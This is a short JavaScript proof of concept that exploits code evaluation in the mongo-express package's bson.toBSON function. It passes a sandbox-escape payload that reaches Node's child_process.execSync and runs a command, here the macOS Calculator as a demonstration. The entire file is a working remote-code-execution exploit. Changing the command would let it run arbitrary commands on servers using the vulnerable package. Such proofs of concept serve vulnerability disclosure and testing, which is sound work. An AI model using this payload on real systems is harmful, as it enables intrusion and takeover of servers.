exploit = "this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('/Applications/Calculator.app/Contents/MacOS/Calculator')"

var bson = require('mongo-express/lib/bson')
bson.toBSON(exploit)
